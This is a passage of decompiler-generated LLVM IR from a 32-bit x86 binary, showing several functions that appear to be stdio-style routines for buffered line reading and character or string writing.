  br i1 %v1_804cf389, label %dec_label_pc_804cebe, label %dec_label_pc_804cf3a

dec_label_pc_804cebe:                             ; preds = %dec_label_pc_804ce52, %dec_label_pc_804cf33
  %v0_804cecc = phi i32 [ %v3_804cf33, %dec_label_pc_804cf33 ], [ %v0_804cf361, %dec_label_pc_804ce52 ]
  %v1_804cebe = inttoptr i32 %v0_804cecc to i8*
  %v2_804cebe = load i8, i8* %v1_804cebe, align 1
  %v3_804cebe = and i8 %v2_804cebe, 64
  %v4_804cebe = icmp eq i8 %v3_804cebe, 0
  br i1 %v4_804cebe, label %dec_label_pc_804cf33, label %dec_label_pc_804cec3

dec_label_pc_804cec3:                             ; preds = %dec_label_pc_804cebe
  %v0_804cec3 = load i32, i32* @global_var_8055e70.116, align 16
  %v9_804cec3 = icmp eq i32 %v0_804cec3, 2
  br i1 %v9_804cec3, label %dec_label_pc_804ceeb, label %dec_label_pc_804cecc

dec_label_pc_804cecc:                             ; preds = %dec_label_pc_804cec3
  %v1_804cecc = add i32 %v0_804cecc, 56
  store i32 %v1_804cecc, i32* @ebx, align 4
  store i32 %v2_804ce5f, i32* @eax, align 4
  %v2_804cedb = call i32 @function_804f2ae(i32 %v2_804ce5f, i32 134541995)
  %v0_804cee0 = load i32, i32* @ebx, align 4
  %v1_804cee3 = call i32 @function_804f2ab(i32 %v0_804cee0)
  %v1_804ceed.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ceeb

dec_label_pc_804ceeb:                             ; preds = %dec_label_pc_804cec3, %dec_label_pc_804cecc
  %v0_804cefd = phi i32 [ %v0_804cecc, %dec_label_pc_804cec3 ], [ %v1_804ceed.pre, %dec_label_pc_804cecc ]
  %v0_804ceeb = load i32, i32* @ebp, align 4
  %v2_804ceed = inttoptr i32 %v0_804cefd to i32*
  %v3_804ceed = load i32, i32* %v2_804ceed, align 4
  %v4_804ceed = or i32 %v3_804ceed, %v0_804ceeb
  %v2_804ceef = urem i32 %v4_804ceed, 65536
  %v9_804ceef = and i32 %v2_804ceef, 832
  %v2_804cef3 = icmp eq i32 %v9_804ceef, 320
  %v1_804cef8 = icmp eq i1 %v2_804cef3, false
  br i1 %v1_804cef8, label %dec_label_pc_804cf19, label %dec_label_pc_804cefa

dec_label_pc_804cefa:                             ; preds = %dec_label_pc_804ceeb
  %v1_804cefe = call i32 @function_804bf78(i32 %v0_804cefd)
  %v1_804cf06 = icmp eq i32 %v1_804cefe, 0
  br i1 %v1_804cf06, label %dec_label_pc_804cf0f, label %dec_label_pc_804cf0a

dec_label_pc_804cf0a:                             ; preds = %dec_label_pc_804cefa
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804cf19

dec_label_pc_804cf0f:                             ; preds = %dec_label_pc_804cefa
  %v0_804cf0f = load i32, i32* @esi, align 4
  %v1_804cf0f = inttoptr i32 %v0_804cf0f to i16*
  %v2_804cf0f = load i16, i16* %v1_804cf0f, align 2
  %v3_804cf0f = and i16 %v2_804cf0f, -65
  store i16 %v3_804cf0f, i16* %v1_804cf0f, align 2
  %v0_804cf13 = load i32, i32* @esi, align 4
  %v1_804cf13 = add i32 %v0_804cf13, 8
  %v2_804cf13 = inttoptr i32 %v1_804cf13 to i32*
  %v3_804cf13 = load i32, i32* %v2_804cf13, align 4
  %v2_804cf16 = add i32 %v0_804cf13, 28
  %v3_804cf16 = inttoptr i32 %v2_804cf16 to i32*
  store i32 %v3_804cf13, i32* %v3_804cf16, align 4
  br label %dec_label_pc_804cf19

dec_label_pc_804cf19:                             ; preds = %dec_label_pc_804ceeb, %dec_label_pc_804cf0a, %dec_label_pc_804cf0f
  %v0_804cf19 = load i32, i32* @global_var_8055e70.116, align 16
  %v9_804cf19 = icmp eq i32 %v0_804cf19, 2
  br i1 %v9_804cf19, label %dec_label_pc_804cf33, label %dec_label_pc_804cf22

dec_label_pc_804cf22:                             ; preds = %dec_label_pc_804cf19
  store i32 %v2_804ce5f, i32* @eax, align 4
  %v2_804cf2b = call i32 @function_804f2ae(i32 %v2_804ce5f, i32 1)
  br label %dec_label_pc_804cf33

dec_label_pc_804cf33:                             ; preds = %dec_label_pc_804cf19, %dec_label_pc_804cebe, %dec_label_pc_804cf22
  %v0_804cf33 = load i32, i32* @esi, align 4
  %v1_804cf33 = add i32 %v0_804cf33, 32
  %v2_804cf33 = inttoptr i32 %v1_804cf33 to i32*
  %v3_804cf33 = load i32, i32* %v2_804cf33, align 4
  store i32 %v3_804cf33, i32* @esi, align 4
  %v1_804cf36 = icmp eq i32 %v3_804cf33, 0
  %v1_804cf38 = icmp eq i1 %v1_804cf36, false
  br i1 %v1_804cf38, label %dec_label_pc_804cebe, label %dec_label_pc_804cf3a

dec_label_pc_804cf3a:                             ; preds = %dec_label_pc_804cf33, %dec_label_pc_804ce52
  %v0_804cf3a = call i32 @function_804cd4c()
  br label %dec_label_pc_804cf67

dec_label_pc_804cf41:                             ; preds = %dec_label_pc_804ce45
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_804cf43 = load i8, i8* %tmp23, align 1
  %v4_804cf43 = and i8 %v3_804cf43, 64
  %v5_804cf43 = icmp eq i8 %v4_804cf43, 0
  br i1 %v5_804cf43, label %dec_label_pc_804cf67, label %dec_label_pc_804cf48

dec_label_pc_804cf48:                             ; preds = %dec_label_pc_804cf41
  store i32 -1, i32* @edi, align 4
  %v1_804cf4f = call i32 @function_804bf78(i32 %v4_804ce39)
  %v1_804cf57 = icmp eq i32 %v1_804cf4f, 0
  %v1_804cf59 = icmp eq i1 %v1_804cf57, false
  br i1 %v1_804cf59, label %dec_label_pc_804cf67, label %dec_label_pc_804cf5b

dec_label_pc_804cf5b:                             ; preds = %dec_label_pc_804cf48
  %v3_804cf5b = load i16, i16* %arg1, align 2
  %v4_804cf5b = and i16 %v3_804cf5b, -65
  store i16 %v4_804cf5b, i16* %arg1, align 2
  %v2_804cf5f = add i32 %v4_804ce39, 8
  %v3_804cf5f = inttoptr i32 %v2_804cf5f to i32*
  %v4_804cf5f = load i32, i32* %v3_804cf5f, align 4
  %v3_804cf62 = add i32 %v4_804ce39, 28
  %v4_804cf62 = inttoptr i32 %v3_804cf62 to i32*
  store i32 %v4_804cf5f, i32* %v4_804cf62, align 4
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804cf67

dec_label_pc_804cf67:                             ; preds = %dec_label_pc_804cf48, %dec_label_pc_804cf41, %dec_label_pc_804cf3a, %dec_label_pc_804cf5b
  %v0_804cf6a = load i32, i32* @edi, align 4
  store i32 %v0_804ce33, i32* @ebx, align 4
  store i32 %v0_804ce32, i32* @esi, align 4
  store i32 %v0_804ce31, i32* @edi, align 4
  store i32 %v0_804ce30, i32* @ebp, align 4
  ret i32 %v0_804cf6a

; uselistorder directives
  uselistorder i32 %v3_804cf33, { 1, 2, 0 }
  uselistorder i32 %v2_804ce5f, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @function_804cd4c, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8055e3c.118 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_8056520.109, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_8055e58.108 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_804cf67, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804cf33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cf19, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ceeb, { 1, 0 }
  uselistorder label %dec_label_pc_804cebe, { 1, 0 }
}

define i32 @function_804cf74(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804cf74:
  %eax.global-to-local = alloca i32, align 4
  %v0_804cf74 = load i32, i32* @ebp, align 4
  %v4_804cf7b = ptrtoint i8* %arg1 to i32
  store i32 %v4_804cf7b, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_804cf7b, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_804cfc5.preheader, label %dec_label_pc_804cfd1

dec_label_pc_804cfc5.preheader:                   ; preds = %dec_label_pc_804cf74
  %v1_804cfc519 = add i32 %arg2, -1
  %v8_804cfc520 = icmp eq i32 %v1_804cfc519, 0
  store i32 %v1_804cfc519, i32* @esi, align 4
  %v1_804cfc621 = icmp eq i1 %v8_804cfc520, false
  br i1 %v1_804cfc621, label %dec_label_pc_804cf8f, label %dec_label_pc_804cfc8

dec_label_pc_804cf8f:                             ; preds = %dec_label_pc_804cfc5.preheader, %dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge.dec_label_pc_804cf8f_crit_edge
  %v0_804cf8f = phi i32 [ %v0_804cf8f.pre, %dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge.dec_label_pc_804cf8f_crit_edge ], [ %arg3, %dec_label_pc_804cfc5.preheader ]
  %v1_804cf8f = add i32 %v0_804cf8f, 16
  %v2_804cf8f = inttoptr i32 %v1_804cf8f to i32*
  %v3_804cf8f = load i32, i32* %v2_804cf8f, align 4
  store i32 %v3_804cf8f, i32* %eax.global-to-local, align 4
  %v2_804cf92 = add i32 %v0_804cf8f, 24
  %v3_804cf92 = inttoptr i32 %v2_804cf92 to i32*
  %v4_804cf92 = load i32, i32* %v3_804cf92, align 4
  %v10_804cf92 = icmp ult i32 %v3_804cf8f, %v4_804cf92
  %v1_804cf95 = icmp eq i1 %v10_804cf92, false
  br i1 %v1_804cf95, label %dec_label_pc_804cfa5, label %dec_label_pc_804cf97

dec_label_pc_804cf97:                             ; preds = %dec_label_pc_804cf8f
  %v1_804cf97 = inttoptr i32 %v3_804cf8f to i8*
  %v2_804cf97 = load i8, i8* %v1_804cf97, align 1
  %v3_804cf97 = zext i8 %v2_804cf97 to i32
  %v4_804cf97 = load i32, i32* @edx, align 4
  %v5_804cf97 = and i32 %v4_804cf97, -256
  %v6_804cf97 = or i32 %v5_804cf97, %v3_804cf97
  store i32 %v6_804cf97, i32* @edx, align 4
  %v1_804cf99 = add i32 %v3_804cf8f, 1
  store i32 %v1_804cf99, i32* %eax.global-to-local, align 4
  %v2_804cf9a = load i32, i32* @ebx, align 4
  %v3_804cf9a = inttoptr i32 %v2_804cf9a to i8*
  store i8 %v2_804cf97, i8* %v3_804cf9a, align 1
  %v0_804cf9c = load i32, i32* @ebx, align 4
  %v1_804cf9c = add i32 %v0_804cf9c, 1
  store i32 %v1_804cf9c, i32* @ebx, align 4
  %v0_804cf9d = load i32, i32* @edx, align 4
  %v1_804cf9d = trunc i32 %v0_804cf9d to i8
  %v10_804cf9d = icmp eq i8 %v1_804cf9d, 10
  %v0_804cfa0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cfa0 = load i32, i32* @ebp, align 4
  %v2_804cfa0 = add i32 %v1_804cfa0, 16
  %v3_804cfa0 = inttoptr i32 %v2_804cfa0 to i32*
  store i32 %v0_804cfa0, i32* %v3_804cfa0, align 4
  br i1 %v10_804cf9d, label %dec_label_pc_804cfc8, label %dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge

dec_label_pc_804cfa5:                             ; preds = %dec_label_pc_804cf8f
  %v0_804cfa9 = call i32 @function_805054c()
  %v1_804cfa9 = trunc i32 %v0_804cfa9 to i8
  store i32 %v0_804cfa9, i32* %eax.global-to-local, align 4
  %sext.mask = urem i32 %v0_804cfa9, 256
  %v11_804cfb1 = icmp eq i32 %sext.mask, 255
  %v1_804cfb4 = icmp eq i1 %v11_804cfb1, false
  br i1 %v1_804cfb4, label %dec_label_pc_804cfc3, label %dec_label_pc_804cfb6

dec_label_pc_804cfb6:                             ; preds = %dec_label_pc_804cfa5
  %v0_804cfb6 = load i32, i32* @ebp, align 4
  %v1_804cfb6 = inttoptr i32 %v0_804cfb6 to i8*
  %v2_804cfb6 = load i8, i8* %v1_804cfb6, align 1
  %v3_804cfb6 = and i8 %v2_804cfb6, 8
  %v4_804cfb6 = icmp eq i8 %v3_804cfb6, 0
  br i1 %v4_804cfb6, label %dec_label_pc_804cfc8, label %dec_label_pc_804cfd1

dec_label_pc_804cfc3:                             ; preds = %dec_label_pc_804cfa5
  %v3_804cfbe = load i32, i32* @ebx, align 4
  %v4_804cfbe = inttoptr i32 %v3_804cfbe to i8*
  store i8 %v1_804cfa9, i8* %v4_804cfbe, align 1
  %v0_804cfc0 = load i32, i32* @ebx, align 4
  %v1_804cfc0 = add i32 %v0_804cfc0, 1
  store i32 %v1_804cfc0, i32* @ebx, align 4
  %v11_804cfc1 = icmp eq i8 %v1_804cfa9, 10
  br i1 %v11_804cfc1, label %dec_label_pc_804cfc8, label %dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge

dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge: ; preds = %dec_label_pc_804cf97, %dec_label_pc_804cfc3
  %v0_804cfc5.pre = load i32, i32* @esi, align 4
  %v1_804cfc5 = add i32 %v0_804cfc5.pre, -1
  %v8_804cfc5 = icmp eq i32 %v1_804cfc5, 0
  store i32 %v1_804cfc5, i32* @esi, align 4
  %v1_804cfc6 = icmp eq i1 %v8_804cfc5, false
  br i1 %v1_804cfc6, label %dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge.dec_label_pc_804cf8f_crit_edge, label %dec_label_pc_804cfc8

dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge.dec_label_pc_804cf8f_crit_edge: ; preds = %dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge
  %v0_804cf8f.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804cf8f

dec_label_pc_804cfc8:                             ; preds = %dec_label_pc_804cfc5.preheader, %dec_label_pc_804cf97, %dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge, %dec_label_pc_804cfc3, %dec_label_pc_804cfb6
  %v0_804cfc8 = load i32, i32* @ebx, align 4
  %v1_804cfc8 = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_804cfc8, %v1_804cfc8
  br i1 %tmp23, label %dec_label_pc_804cfcc, label %dec_label_pc_804cfd1

dec_label_pc_804cfcc:                             ; preds = %dec_label_pc_804cfc8
  %v1_804cfcc = inttoptr i32 %v0_804cfc8 to i8*
  store i8 0, i8* %v1_804cfcc, align 1
  %v0_804cfd6.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804cfd3

dec_label_pc_804cfd1:                             ; preds = %dec_label_pc_804cfc8, %dec_label_pc_804cfb6, %dec_label_pc_804cf74
  br label %dec_label_pc_804cfd3

dec_label_pc_804cfd3:                             ; preds = %dec_label_pc_804cfcc, %dec_label_pc_804cfd1
  %v0_804cfd6 = phi i32 [ %v0_804cfd6.pre, %dec_label_pc_804cfcc ], [ 0, %dec_label_pc_804cfd1 ]
  store i32 %v0_804cfd6, i32* %eax.global-to-local, align 4
  store i32 %v0_804cf74, i32* @ebp, align 4
  ret i32 %v0_804cfd6

; uselistorder directives
  uselistorder i32 %v0_804cfd6, { 1, 0 }
  uselistorder i32 %v0_804cfc8, { 1, 0 }
  uselistorder i32 %v1_804cfc5, { 1, 0 }
  uselistorder i32 %v0_804cfa9, { 0, 2, 1 }
  uselistorder i32 %v0_804cf8f, { 1, 0 }
  uselistorder label %dec_label_pc_804cfd3, { 1, 0 }
  uselistorder label %dec_label_pc_804cfc8, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804cf8f, { 1, 0 }
}

define i32 @function_804cfe0(i8 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804cfe0:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-9 = alloca i8, align 1
  %v0_804cfe0 = load i32, i32* @esi, align 4
  %v0_804cfe1 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_804cfe9 = sext i8 %arg1 to i32
  store i32 %v4_804cfe9, i32* @esi, align 4
  %v1_804cfed = add i32 %arg2, 16
  %v2_804cfed = inttoptr i32 %v1_804cfed to i32*
  %v3_804cfed = load i32, i32* %v2_804cfed, align 4
  store i32 %v3_804cfed, i32* %eax.global-to-local, align 4
  %v2_804cff0 = add i32 %arg2, 28
  %v3_804cff0 = inttoptr i32 %v2_804cff0 to i32*
  %v4_804cff0 = load i32, i32* %v3_804cff0, align 4
  %v10_804cff0 = icmp ult i32 %v3_804cfed, %v4_804cff0
  %v1_804cff3 = icmp eq i1 %v10_804cff0, false
  br i1 %v1_804cff3, label %dec_label_pc_804d002, label %dec_label_pc_804cff5

dec_label_pc_804cff5:                             ; preds = %dec_label_pc_804cfe0
  store i32 %v4_804cfe9, i32* @edx, align 4
  %v3_804cff7 = inttoptr i32 %v3_804cfed to i8*
  store i8 %arg1, i8* %v3_804cff7, align 1
  %v0_804cff9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cff9 = add i32 %v0_804cff9, 1
  store i32 %v1_804cff9, i32* %eax.global-to-local, align 4
  %v1_804cffa = load i32, i32* @ebx, align 4
  %v2_804cffa = add i32 %v1_804cffa, 16
  %v3_804cffa = inttoptr i32 %v2_804cffa to i32*
  store i32 %v1_804cff9, i32* %v3_804cffa, align 4
  %v0_804d097.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804d097

dec_label_pc_804d002:                             ; preds = %dec_label_pc_804cfe0
  %v1_804d002 = inttoptr i32 %arg2 to i16*
  %v2_804d002 = load i16, i16* %v1_804d002, align 2
  %v3_804d002 = zext i16 %v2_804d002 to i32
  %v1_804d005 = and i32 %v3_804d002, 192
  store i32 %v1_804d005, i32* %eax.global-to-local, align 4
  %v6_804d00a = icmp eq i32 %v1_804d005, 192
  br i1 %v6_804d00a, label %dec_label_pc_804d025, label %dec_label_pc_804d011

dec_label_pc_804d011:                             ; preds = %dec_label_pc_804d002
  %v0_804d011 = load i32, i32* @edx, align 4
  %sext = mul i32 %v0_804d011, 16777216
  %v5_804d019 = sdiv i32 %sext, 16777216
  %v7_804d019 = call i32 @function_804fd7c(i16* %v1_804d002, i32 128, i32 %v0_804d011, i32 %v5_804d019)
  store i32 %v7_804d019, i32* %eax.global-to-local, align 4
  %v1_804d021 = icmp eq i32 %v7_804d019, 0
  %v1_804d023 = icmp eq i1 %v1_804d021, false
  br i1 %v1_804d023, label %dec_label_pc_804d09c, label %dec_label_pc_804d011.dec_label_pc_804d025_crit_edge

dec_label_pc_804d011.dec_label_pc_804d025_crit_edge: ; preds = %dec_label_pc_804d011
  %v0_804d025.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804d025

dec_label_pc_804d025:                             ; preds = %dec_label_pc_804d011.dec_label_pc_804d025_crit_edge, %dec_label_pc_804d002
  %v0_804d088 = phi i32 [ %v0_804d025.pre, %dec_label_pc_804d011.dec_label_pc_804d025_crit_edge ], [ %arg2, %dec_label_pc_804d002 ]
  %v1_804d025 = add i32 %v0_804d088, 4
  %v2_804d025 = inttoptr i32 %v1_804d025 to i32*
  %v3_804d025 = load i32, i32* %v2_804d025, align 4
  %v13_804d025 = icmp eq i32 %v3_804d025, -2
  %v1_804d029 = icmp eq i1 %v13_804d025, false
  br i1 %v1_804d029, label %dec_label_pc_804d032, label %dec_label_pc_804d02b

dec_label_pc_804d02b:                             ; preds = %dec_label_pc_804d025
  %v0_804d02b = load i32, i32* @esi, align 4
  store i32 %v0_804d02b, i32* @ecx, align 4
  %v1_804d02d = urem i32 %v0_804d02b, 256
  store i32 %v1_804d02d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d09f

dec_label_pc_804d032:                             ; preds = %dec_label_pc_804d025
  %v1_804d032 = add i32 %v0_804d088, 12
  %v2_804d032 = inttoptr i32 %v1_804d032 to i32*
  %v3_804d032 = load i32, i32* %v2_804d032, align 4
  store i32 %v3_804d032, i32* %eax.global-to-local, align 4
  %v2_804d035 = add i32 %v0_804d088, 8
  %v3_804d035 = inttoptr i32 %v2_804d035 to i32*
  %v4_804d035 = load i32, i32* %v3_804d035, align 4
  %v15_804d035 = icmp eq i32 %v3_804d032, %v4_804d035
  br i1 %v15_804d035, label %dec_label_pc_804d07a, label %dec_label_pc_804d03a

dec_label_pc_804d03a:                             ; preds = %dec_label_pc_804d032
  %v2_804d03a = add i32 %v0_804d088, 16
  %v3_804d03a = inttoptr i32 %v2_804d03a to i32*
  %v4_804d03a = load i32, i32* %v3_804d03a, align 4
  %v15_804d03a = icmp eq i32 %v3_804d032, %v4_804d03a
  %v1_804d03d = icmp eq i1 %v15_804d03a, false
  br i1 %v1_804d03d, label %dec_label_pc_804d04f, label %dec_label_pc_804d03f

dec_label_pc_804d03f:                             ; preds = %dec_label_pc_804d03a
  %v2_804d043 = call i32 @function_804bf78(i32 %v0_804d088)
  store i32 %v2_804d043, i32* %eax.global-to-local, align 4
  %v1_804d04b = icmp eq i32 %v2_804d043, 0
  %v1_804d04d = icmp eq i1 %v1_804d04b, false
  br i1 %v1_804d04d, label %dec_label_pc_804d09c, label %dec_label_pc_804d03f.dec_label_pc_804d04f_crit_edge

dec_label_pc_804d03f.dec_label_pc_804d04f_crit_edge: ; preds = %dec_label_pc_804d03f
  %v0_804d04f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804d04f

dec_label_pc_804d04f:                             ; preds = %dec_label_pc_804d03f.dec_label_pc_804d04f_crit_edge, %dec_label_pc_804d03a
  %v0_804d04f = phi i32 [ %v0_804d04f.pre, %dec_label_pc_804d03f.dec_label_pc_804d04f_crit_edge ], [ %v0_804d088, %dec_label_pc_804d03a ]
  %v1_804d04f = add i32 %v0_804d04f, 16
  %v2_804d04f = inttoptr i32 %v1_804d04f to i32*
  %v3_804d04f = load i32, i32* %v2_804d04f, align 4
  store i32 %v3_804d04f, i32* %eax.global-to-local, align 4
  %v0_804d052 = load i32, i32* @esi, align 4
  store i32 %v0_804d052, i32* %edx.global-to-local, align 4
  %v1_804d054 = trunc i32 %v0_804d052 to i8
  %v3_804d054 = inttoptr i32 %v3_804d04f to i8*
  store i8 %v1_804d054, i8* %v3_804d054, align 1
  %v0_804d056 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d056 = add i32 %v0_804d056, 1
  store i32 %v1_804d056, i32* %eax.global-to-local, align 4
  %v1_804d057 = load i32, i32* @ebx, align 4
  %v2_804d057 = add i32 %v1_804d057, 16
  %v3_804d057 = inttoptr i32 %v2_804d057 to i32*
  store i32 %v1_804d056, i32* %v3_804d057, align 4
  %v0_804d05a = load i32, i32* @ebx, align 4
  %v1_804d05a = add i32 %v0_804d05a, 1
  %v2_804d05a = inttoptr i32 %v1_804d05a to i8*
  %v3_804d05a = load i8, i8* %v2_804d05a, align 1
  %v4_804d05a = urem i8 %v3_804d05a, 2
  %v5_804d05a = icmp eq i8 %v4_804d05a, 0
  br i1 %v5_804d05a, label %dec_label_pc_804d095, label %dec_label_pc_804d060

dec_label_pc_804d060:                             ; preds = %dec_label_pc_804d04f
  %v0_804d060 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d060 = trunc i32 %v0_804d060 to i8
  %v10_804d060 = icmp eq i8 %v1_804d060, 10
  %v1_804d063 = icmp eq i1 %v10_804d060, false
  br i1 %v1_804d063, label %dec_label_pc_804d095, label %dec_label_pc_804d065

dec_label_pc_804d065:                             ; preds = %dec_label_pc_804d060
  %v2_804d069 = call i32 @function_804bf78(i32 %v0_804d05a)
  store i32 %v2_804d069, i32* %eax.global-to-local, align 4
  %v1_804d071 = icmp eq i32 %v2_804d069, 0
  br i1 %v1_804d071, label %dec_label_pc_804d095, label %dec_label_pc_804d075

dec_label_pc_804d075:                             ; preds = %dec_label_pc_804d065
  %v0_804d075 = load i32, i32* @ebx, align 4
  %v1_804d075 = add i32 %v0_804d075, 16
  %v2_804d075 = inttoptr i32 %v1_804d075 to i32*
  %v3_804d075 = load i32, i32* %v2_804d075, align 4
  %v4_804d075 = add i32 %v3_804d075, -1
  store i32 %v4_804d075, i32* %v2_804d075, align 4
  br label %dec_label_pc_804d09c

dec_label_pc_804d07a:                             ; preds = %dec_label_pc_804d032
  %v0_804d07a = load i32, i32* @esi, align 4
  %v6_804d07c = trunc i32 %v0_804d07a to i8
  store i8 %v6_804d07c, i8* %stack_var_-9, align 1
  %v2_804d083 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_804d083, i32* %eax.global-to-local, align 4
  %v5_804d088 = inttoptr i32 %v0_804d088 to i16*
  %sext9 = mul i32 %v0_804d07a, 16777216
  %v5_804d089 = sdiv i32 %sext9, 16777216
  %v7_804d089 = call i32 @function_804fc0c(i16* %v5_804d088, i32 %v2_804d083, i32 1, i32 %v5_804d089)
  store i32 %v7_804d089, i32* %eax.global-to-local, align 4
  %v1_804d091 = icmp eq i32 %v7_804d089, 0
  br i1 %v1_804d091, label %dec_label_pc_804d09c, label %dec_label_pc_804d095

dec_label_pc_804d095:                             ; preds = %dec_label_pc_804d07a, %dec_label_pc_804d065, %dec_label_pc_804d060, %dec_label_pc_804d04f
  %v0_804d095 = load i32, i32* @esi, align 4
  store i32 %v0_804d095, i32* @edx, align 4
  br label %dec_label_pc_804d097

dec_label_pc_804d097:                             ; preds = %dec_label_pc_804cff5, %dec_label_pc_804d095
  %v0_804d097 = phi i32 [ %v0_804d097.pre, %dec_label_pc_804cff5 ], [ %v0_804d095, %dec_label_pc_804d095 ]
  %v1_804d097 = urem i32 %v0_804d097, 256
  store i32 %v1_804d097, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d09f

dec_label_pc_804d09c:                             ; preds = %dec_label_pc_804d07a, %dec_label_pc_804d03f, %dec_label_pc_804d011, %dec_label_pc_804d075
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d09f

dec_label_pc_804d09f:                             ; preds = %dec_label_pc_804d097, %dec_label_pc_804d02b, %dec_label_pc_804d09c
  %v0_804d0a4 = phi i32 [ %v1_804d097, %dec_label_pc_804d097 ], [ %v1_804d02d, %dec_label_pc_804d02b ], [ -1, %dec_label_pc_804d09c ]
  store i32 %v0_804cfe1, i32* @ebx, align 4
  store i32 %v0_804cfe0, i32* @esi, align 4
  ret i32 %v0_804d0a4

; uselistorder directives
  uselistorder i32 %v1_804d097, { 1, 0 }
  uselistorder i32 %v1_804d02d, { 1, 0 }
  uselistorder i32 %v0_804d088, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v0_804d011, { 1, 0 }
  uselistorder label %dec_label_pc_804d09f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d09c, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_804d097, { 1, 0 }
}

define i32 @function_804d0a8() local_unnamed_addr {
dec_label_pc_804d0a8:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804d0a8 = load i32, i32* @esi, align 4
  %v0_804d0a9 = load i32, i32* @ebx, align 4
  store i32 %v0_804d0a9, i32* %stack_var_-8, align 4
  store i32 %tmp2, i32* @ebx, align 4
  %v1_804d0b2 = inttoptr i32 %tmp2 to i8*
  %v2_804d0b2 = call i32 @function_804d1ac(i8* %v1_804d0b2)
  store i32 %v2_804d0b2, i32* @esi, align 4
  %v0_804d0c3 = load i32, i32* @ebx, align 4
  %v5_804d0c4 = call i32 @function_804d0dc(i32 %v0_804d0c3, i64 1, i32 %v2_804d0b2, i32 %tmp)
  %v1_804d0cf = load i32, i32* @esi, align 4
  %v12_804d0cf = icmp eq i32 %v5_804d0c4, %v1_804d0cf
  %v1_804d0d1 = icmp eq i1 %v12_804d0cf, false
  br i1 %v1_804d0d1, label %dec_label_pc_804d0d5, label %dec_label_pc_804d0d3

dec_label_pc_804d0d3:                             ; preds = %dec_label_pc_804d0a8
  br label %dec_label_pc_804d0d5

dec_label_pc_804d0d5:                             ; preds = %dec_label_pc_804d0a8, %dec_label_pc_804d0d3
  %v0_804d0d5 = phi i32 [ -1, %dec_label_pc_804d0a8 ], [ %v5_804d0c4, %dec_label_pc_804d0d3 ]
  %v2_804d0d8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d0d8, i32* @ebx, align 4
  store i32 %v0_804d0a8, i32* @esi, align 4
  ret i32 %v0_804d0d5

; uselistorder directives
  uselistorder i32 %v5_804d0c4, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 0 }
  uselistorder label %dec_label_pc_804d0d5, { 1, 0 }
}

define i32 @function_804d0dc(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804d0dc:
  %stack_var_-28 = alloca i32, align 4
  %v0_804d0dc = load i32, i32* @edi, align 4
  %v0_804d0dd = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_804d0e3 = trunc i64 %arg2 to i32
  store i32 %v4_804d0e3, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804d0eb = inttoptr i32 %arg4 to i16*
  %v2_804d0eb = load i16, i16* %v1_804d0eb, align 2
  %v1_804d0ee = and i16 %v2_804d0eb, 192
  %v6_804d0f3 = icmp eq i16 %v1_804d0ee, 192
  br i1 %v6_804d0f3, label %dec_label_pc_804d10e, label %dec_label_pc_804d0fa

dec_label_pc_804d0fa:                             ; preds = %dec_label_pc_804d0dc
